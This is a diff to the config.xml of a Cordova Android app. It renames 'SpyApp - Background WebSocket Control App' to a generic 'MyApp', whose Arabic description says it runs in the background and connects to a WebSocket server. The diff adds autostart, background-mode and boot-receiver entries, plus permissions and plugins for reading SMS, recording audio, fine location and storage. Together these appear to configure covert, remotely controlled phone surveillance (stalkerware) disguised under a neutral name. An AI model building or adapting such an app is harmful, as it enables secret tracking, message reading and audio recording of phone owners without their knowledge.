@@ -1,41 +1,69 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<widget id="com.spyapp" version="1.0.0"
+<?xml version='1.0' encoding='utf-8'?>
+<widget id="com.example.myapp" version="1.0.0"
     xmlns="http://www.w3.org/ns/widgets"
     xmlns:cdv="http://cordova.apache.org/ns/1.0">
 
-    <name>SpyApp</name>
+    <name>MyApp</name>
     <description>
-        SpyApp - Background WebSocket Control App
+        تطبيق كوردوفا يعمل في الخلفية ويتصل بسيرفر WebSocket
     </description>
-    <author email="you@example.com" href="https://yourwebsite.com">
-        Your Name
+    <author email="you@example.com" href="https://example.com">
+        مطور التطبيق
     </author>
 
-    <content src="index.html" />
+    <!-- ================= Plugins ================= -->
+    <plugin name="cordova-plugin-foreground-service" />
+    <plugin name="cordova-plugin-autostart" />
+    <plugin name="cordova-plugin-background-mode" />
+    <plugin name="cordova-plugin-battery-status" />
+    <plugin name="cordova-plugin-network-information" />
 
-    <allow-navigation href="*" />
-    <allow-intent href="*" />
+    <!-- إذا تحتاج SMS أو تسجيل صوت -->
+    <plugin name="cordova-sms-plugin" />
+    <plugin name="cordova-plugin-media-capture" />
+    <plugin name="cordova-plugin-file" />
 
-    <preference name="Fullscreen" value="true" />
-    <preference name="Orientation" value="portrait" />
-    <preference name="android-minSdkVersion" value="23" />
-    <preference name="android-targetSdkVersion" value="34" />
-    <preference name="AndroidPersistentFileLocation" value="Compatibility" />
-    <preference name="loadUrlTimeoutValue" value="700000" />
-    <preference name="AutoHideSplashScreen" value="true" />
-    <preference name="SplashScreenDelay" value="0" />
-    <preference name="ShowSplashScreenSpinner" value="false" />
-
+    <!-- ================= Platforms ================= -->
     <platform name="android">
-        <allow-intent href="market:*" />
-        <allow-intent href="geo:*" />
-        <allow-intent href="tel:*" />
-        <allow-intent href="sms:*" />
-        <allow-intent href="mailto:*" />
 
-        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest/application">
-            <application android:usesCleartextTraffic="true" />
+        <!-- صلاحيات أساسية -->
+        <edit-config file="AndroidManifest.xml" mode="merge" target="/manifest">
+            <manifest>
+                <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+                <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+                <uses-permission android:name="android.permission.WAKE_LOCK" />
+                <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+                <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+                <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+                <uses-permission android:name="android.permission.READ_SMS" />
+                <uses-permission android:name="android.permission.RECORD_AUDIO" />
+                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+            </manifest>
         </edit-config>
+
+        <!-- تشغيل تلقائي بعد إعادة التشغيل -->
+        <edit-config file="AndroidManifest.xml" mode="merge" target="/manifest/application">
+            <application>
+                <receiver android:name="com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver"
+                          android:enabled="true"
+                          android:exported="true"
+                          android:directBootAware="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.BOOT_COMPLETED" />
+                        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                    </intent-filter>
+                </receiver>
+            </application>
+        </edit-config>
+
     </platform>
+
+    <!-- ================= Preferences ================= -->
+    <preference name="android-minSdkVersion" value="22" />
+    <preference name="android-targetSdkVersion" value="34" />
+
+    <!-- أيقونة التطبيق -->
+    <icon src="res/icon.png" />
 
 </widget>
